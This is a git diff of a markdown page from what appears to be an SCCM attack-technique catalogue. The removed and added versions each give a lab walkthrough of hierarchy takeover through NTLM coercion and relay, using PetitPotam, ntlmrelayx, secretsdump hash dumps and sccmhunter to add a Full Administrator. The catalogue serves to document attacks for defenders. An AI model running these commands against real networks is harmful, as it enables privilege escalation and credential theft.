@@ -1,64 +1,105 @@
-# TAKEOVER-5
+# - TAKEOVER-2
 
 ## Description
-Hierarchy Takeover via NTLM Coercion and SMB Relay From Passive Site Server
+Hierarchy Takeover via NTLM Coercion and Relay from Site Server to AdminService
 
 ## MITRE ATT&CK TTPs
-- [T1078.002 - Valid Accounts](https://attack.mitre.org/techniques/T1078/002/)
-- [T1187 - Forced Authentication](https://attack.mitre.org/techniques/T1187/)
-- [T1003.004 - OS Credential Dumping](https://attack.mitre.org/techniques/T1003/004/) 
+- [TA0008](https://attack.mitre.org/tactics/TA0008) - Lateral Movement
+- [TA0004](https://attack.mitre.org/tactics/TA0004) - Privilege Escalation
 
 ## Requirements
 
-Valid domain credentials with network connectivity to the passive primary site server and active primary site server.
+### Coercion
+- Valid Active Directory domain credentials
+- Connectivity to SMB (TCP/445) on a coercion target:
+    - TAKEOVER-2.1: Primary site server 
+    - TAKEOVER-2.2: Passive site server
+    - TAKEOVER-2.3: CAS site server
+
+- Connectivity from the coercion target to SMB (TCP/445) on the relay server
+- Coercion target settings:
+    - `BlockNTLM` = `0` or not present, or = `1` and `BlockNTLMServerExceptionList` contains attacker relay server
+    - `RestrictSendingNTLMTraffic` = `0`, `1`, or not present, or = `2` and `ClientAllowedNTLMServers` contains attacker relay server
+    - Domain computer account is not in `Protected Users`
+- Domain controller settings:
+    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains coercion target
+    - `LmCompatibilityLevel` < `5` or not present, or = `5` and LmCompatibilityLevel >= `3` on the coercion target
+
+### Relay
+- Connectivity from the relay server to HTTPS (TCP/443) on the relay target hosting the SMS Provider role
+
 
 ## Summary
 
-For high availability configurations the passive site server role is deployed to SCCM sites where redundancy for the site server role is required. A passive site server shares the same configuration and privileges as the active site server yet performs no writes or changes to the site until promoted manually or during an automated failover. During setup, the passive site server is [required](https://learn.microsoft.com/en-us/mem/configmgr/core/servers/deploy/configure/site-server-high-availability#configurations-for-the-site-server-in-passive-mode) to be a member of the active site server's local administrator group. In default setups, SMB signing is not enforced on either site server host operating system and are vulnerable to NTLM relay attacks. 
+The SMS Provider is a SCCM site server role installed by default on the site server when configuring a primary site or central administration site. The role can optionally be installed on additional SCCM site systems for high availability configurations.  The SMS Provider is a Windows Management Instrumentation (WMI) provider that performs as an intermediary for accessing and modifying data stored in the site database. Access to the SMS Provider is controlled via membership of the the `SMS Admins` local security group on each site server. The site server computer account is a member of the `SMS Admins` security group on each SMS Provider in a site by default.
+
+The SMS Provider also provides access to the site database via the administration service (adminservice) REST API and uses Microsoft Negotiate for authentication. In default configurations, the adminservice is vulnerable to NTLM relay attacks. 
 
 ## Impact
 
-This technique may allow an attacker to relay a passive site server machine account to the primary site server host and compromise and primary site server machine account. With control of this account, an attacker could perform a pass-the-hash (PtH) attack to authenticate to the administration service hosted on the site server operating system and elevate their privileges to "Full Administrator" for the SCCM Hierarchy. If successful, this technique enables lateral movement to all SCCM clients and/or sensitive systems.
+This technique may allow an attacker to relay a site server machine account to a remote SMS Provider and elevate their privileges to "Full Administrator" for the SCCM Hierarchy. If successful, this technique enables an attacker to execute arbitrary programs on any client device that is online as SYSTEM, the currently logged on user, or as a specific user when they next log on.
 
 ## Defensive IDs
 
+- [PREVENT-9: Enforce MFA for SMS Provider calls](../../../defense-techniques/PREVENT/PREVENT-9/prevent-9_description.md)
+- [DETECT-4: Monitor SMS Admins group membership](../../../defense-techniques/DETECT/DETECT-4/detect-4_description.md)
+
+## Subtechniques
+- TAKEOVER-2.1: NTLM relay primary site server SMB to AdminService on remote SMS Provider
+- TAKEOVER-2.2: NTLM relay passive site server SMB to AdminService on remote SMS Provider
+- TAKEOVER-2.3: NTLM relay CAS site server SMB to AdminService on remote SMS Provider
+
+
 ## Examples
 
-- Use SCCMHunter to profile SCCM site system server roles
-- Use PetitPotam to coerce authentication from passive site server
-- Use NTLMRelayx to relay credentials to SMB service on active site server
-- Proxy secretsdump to recover active site server credentials
-- Use SCCMHunter to PtH and add an arbitrary admin user
-
-### SCCMHunter
-
-The results of the `find` module indicate:
-- The *SCCM.INTERNAL.LAB* and *PASSIVE.INTERNAL.LAB* sytems are both site servers in the "LAB" site
-- The *SCCM.INTERNAL.LAB* host is the active site server and the *PASSIVE.INTERNAL.LAB* host is the passive site server
-- SMB signing is disabled on both systems
-
+1. Use `SCCMHunter` to  profile SCCM infrastructure.
 
 ```
-[04:24:43 PM] INFO     [+] Finished profiling Site Servers.                                                                                                                                                                                                                                    
-[04:24:43 PM] INFO     +----------------------+-------------------+-----------------+--------------+---------------+----------+-----------+---------+                                                                                                                                          
-                       | Hostname             | SiteCode          | SigningStatus   | SiteServer   | SMSProvider   | Active   | Passive   | MSSQL   |                                                                                                                                          
-                       +======================+===================+=================+==============+===============+==========+===========+=========+                                                                                                                                          
-                       | sccm.internal.lab    | LAB               | False           | True         | True          | True     | False     | False   |                                                                                                                                          
-                       +----------------------+-------------------+-----------------+--------------+---------------+----------+-----------+---------+                                                                                                                                          
-                       | passive.internal.lab | LAB               | False           | True         | True          | False    | True      | False   |                                                                                                                                          
-                       +----------------------+-------------------+-----------------+--------------+---------------+----------+-----------+---------+ 
+[02:00:25 PM] INFO     [+] Finished profiling all discovered computers.                                   
+[02:00:25 PM] INFO     +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
+                       | Hostname                | SiteCode   | SigningStatus   | SiteServer   | ManagementPoint   | DistributionPoint   | SMSProvider   | WSUS   | MSSQL   |
+                       +=========================+============+=================+==============+===================+=====================+===============+========+=========+
+                       | provider.internal.lab   | None       | False           | False        | False             | False               | True          | False  | False   |
+                       +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
+                       | sccm.internal.lab       | LAB        | False           | True         | True              | False               | True          | False  | False   |
+                       +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+       
 ```
 
-### PetitPotam
+2. On the attacker relay server, start `ntlmrelayx`, targeting the URL of the AdminService API on the remote SMS Provider identified in the previous step, and provide a target account to add as a Full Administrator.
 
- - Valid domain credentials are used to coerce authentication from the *PASSIVE.INTERNAL.LAB* passive site server to the attacker host
+```
+└─# python3 ntlmrelayx.py --adminservice --logonname "lab\specter" --displayname "lab\specter" --objectsid <USER SID> -smb2support -t https://SMS_PROVIDER_URL_OR_IP/AdminService/wmi/SMS_Admin
+Impacket v0.10.1.dev1+20230802.213755.1cebdf31 - Copyright 2022 Fortra
+
+[*] Protocol Client SMB loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client RPC loaded..
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server
+[*] Setting up HTTP Server on port 80
+[*] Setting up WCF Server
+[*] Setting up RAW Server on port 6666
+
+```
+
+
+3. From the attacker host, coerce NTLM authentication from the site server via SMB, targeting the relay server's IP address:
+
 
 ```
 ┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/PetitPotam]
-└─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd 10.10.100.136 passive.internal.lab
+└─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd <NTLMRELAYX_LISTENER_IP> <SITE_SERVER_IP> 
 
 Trying pipe lsarpc
-[-] Connecting to ncacn_np:passive.internal.lab[\PIPE\lsarpc]
+[-] Connecting to ncacn_np:10.10.100.121[\PIPE\lsarpc]
 [+] Connected!
 [+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
 [+] Successfully bound!
@@ -70,122 +111,37 @@ Trying pipe lsarpc
 [+] Attack worked!
 
 ```
-
-
-### NTLMRelayx
-- Authentication from the *PASSIVE.INTERNAL.LAB* site server is caught and relayed from the attacker host to the *SCCM.INTERNAL.LAB* active site server. The `-socks` flag is used to hold the authenticated session open
+After a few seconds, you should receive an SMB connection on the relay server that is forwarded to the AdminService on the SMS Provider to add a Full Administrator:
 
 ```
-┌──(adminservice)─(root㉿DEKSTOP-2QO0YEUW)-[/opt/impacket/examples]
-└─# python3 ntlmrelayx.py -t 10.10.100.121 -smb2support -socks
-Impacket v0.10.1.dev1+20230802.213755.1cebdf31 - Copyright 2022 Fortra
+┌──(adminservice)─(root㉿DEKSTOP-2QO0YEUW)-[/opt/adminservice/examples]
 
-[*] Protocol Client SMB loaded..
-[*] Protocol Client IMAPS loaded..
-[*] Protocol Client IMAP loaded..
-[*] Protocol Client RPC loaded..
-[*] Protocol Client DCSYNC loaded..
-[*] Protocol Client MSSQL loaded..
-[*] Protocol Client LDAPS loaded..
-[*] Protocol Client LDAP loaded..
-[*] Protocol Client SMTP loaded..
-[*] Protocol Client HTTPS loaded..
-[*] Protocol Client HTTP loaded..
-[*] Running in relay mode to single host
-[*] SOCKS proxy started. Listening at port 1080
-[*] IMAPS Socks Plugin loaded..
-[*] MSSQL Socks Plugin loaded..
-[*] HTTP Socks Plugin loaded..
-[*] HTTPS Socks Plugin loaded..
-[*] SMB Socks Plugin loaded..
-[*] IMAP Socks Plugin loaded..
-[*] SMTP Socks Plugin loaded..
-[*] Setting up SMB Server
-[*] Setting up HTTP Server on port 80
- * Serving Flask app 'impacket.examples.ntlmrelayx.servers.socksserver'
- * Debug mode: off
-[*] Setting up WCF Server
-[*] Setting up RAW Server on port 6666
 
 [*] Servers started, waiting for connections
-Type help for list of commands
-ntlmrelayx> [*] SMBD-Thread-9 (process_request_thread): Received connection from 10.10.100.141, attacking target smb://10.10.100.121
-[*] Authenticating against smb://10.10.100.121 as LAB/PASSIVE$ SUCCEED
-[*] SOCKS: Adding LAB/PASSIVE$@10.10.100.121(445) to active SOCKS connection. Enjoy
-[*] SMBD-Thread-10 (process_request_thread): Connection from 10.10.100.141 controlled, but there are no more targets left!
-[*] SOCKS: Proxying client session for LAB/PASSIVE$@10.10.100.121(445)
-```
-
-### Secretsdump
- - Secretsdump is proxied through the existing authenticated session to recover the *SCCM.INTERNAL.LAB* site server's hashed credential
-
-```
-┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/PetitPotam]
-└─#  proxychains secretsdump.py lab/passive\$@sccm.internal.lab                     
-[proxychains] config file found: /etc/proxychains4.conf
-[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
-[proxychains] DLL init: proxychains-ng 4.16
-Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
-
-Password:
-[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.100.121:445  ...  OK
-[*] Target system bootKey: 0x436a3e67c2c89ded60aeb1f1819428c8
-[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:003d349493bc6acfb242ae5c2ff3d819:::
-[*] Dumping cached domain logon information (domain/username:hash)
-INTERNAL.LAB/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42
-[*] Dumping LSA Secrets
-[*] $MACHINE.ACC 
-lab\SCCM$:aes256-cts-hmac-sha1-96:76bf72e59677dfe072fd6609ccdc1343d318f7cc557b25588b36046747f80172
-lab\SCCM$:aes128-cts-hmac-sha1-96:b2d7f1a79de08211ae6a518c82a715f4
-lab\SCCM$:des-cbc-md5:5de98a07aefb983e
+[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.10.100.121, attacking target https://provider.internal.lab
+[*] Exiting standard auth flow to add SCCM admin...
+[*] Authenticating against https://provider.internal.lab as LAB/SCCM$
+[*] Skipping user SCCM$ since attack was already performed
+[*] Server returned code 201, attack successful
 
 ```
 
-### SCCMHunter
 
-- The recovered active site server machine account hash is used to authenticate to the Administration Service API and add an arbitrary user as Full Admin
+4. Confirm that the account now has the `Full Administrator` role by querying WMI on an SMS Provider.
 
-```
- ┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/sccmhunter]
-└─# python3 sccmhunter.py admin -u sccm\$ -p aad3b435b51404eeaad3b435b51404ee:6963d86f6d65497d7b2126d44e6cdb4e -ip 10.10.100.121
-    
-[06:53:08 PM] INFO     [!] Enter help for extra shell commands                                                                                               
-() C:\ >> show_admins 
-[06:53:11 PM] INFO     Tasked SCCM to list current SMS Admins.                                                                                               
-[06:53:11 PM] INFO     Current Full Admin Users:                                                                                                             
-[06:53:11 PM] INFO     lab\Administrator                                                                                                                     
-() (C:\) >> get_user specter
-[06:53:13 PM] INFO     [*] Collecting users...                                                                                                               
-[06:53:13 PM] INFO     [+] User found.                                                                                                                       
-[06:53:14 PM] INFO     ------------------------------------------                                                                                            
-                       DistinguishedName: CN=specter,OU=DOMUSERS,DC=internal,DC=lab                                                                          
-                       FullDomainName: INTERNAL.LAB                                                                                                          
-                       FullUserName: specter                                                                                                              
-                       Mail:                                                                                                                                 
-                       NetworkOperatingSystem: Windows NT                                                                                                    
-                       ResourceId: 2063597574                                                                                                                
-                       sid: S-1-5-21-2391214593-4168590120-2599633397-1109                                                                                   
-                       UniqueUserName: lab\specter                                                                                                           
-                       UserAccountControl: 66048                                                                                                             
-                       UserName: specter                                                                                                           
-                       UserPrincipalName: specter@internal.lab                                                                                        
-                       ------------------------------------------                                                                                            
-() (C:\) >> add_admin specter S-1-5-21-2391214593-4168590120-2599633397-1109
-[06:53:19 PM] INFO     Tasked SCCM to add specter as an administrative user.                                                                                 
-[06:53:19 PM] INFO     [+] Successfully added specter as an admin.                                                                                           
-() (C:\) >> show_admins 
-[06:53:20 PM] INFO     Tasked SCCM to list current SMS Admins.                                                                                               
-[06:53:20 PM] INFO     Current Full Admin Users:                                                                                                             
-[06:53:20 PM] INFO     lab\Administrator                                                                                                                     
-[08:46:39 PM] INFO     specter 
+    With `sccmhunter`:
+    ```
+    $ python3 sccmhunter.py  admin -u specter -p <PASSWORD> -ip SITE-SMS          
 
-
-```
-
+    [14:16:54] INFO     [!] Enter help for extra shell commands                                                                                                                                              
+    () (C:\) >> show_admins
+    [14:17:11] INFO     Tasked SCCM to list current SMS Admins.                                                                                                                                              
+    [14:17:12] INFO     Current Full Admin Users:
+    [14:17:13] INFO     lab\Administrator 
+    [14:17:13] INFO     lab\specter 
+    ```
 
 ## References
-Author, Title, URL
+- Garrett Foster, Site Takeover via SCCM’s AdminService API, https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf
+- Microsoft, Plan for the SMS Provider, https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/plan-for-the-sms-provider
+- Microsoft, What is the administration service in Configuration Manager?, https://learn.microsoft.com/en-us/mem/configmgr/develop/adminservice/overview
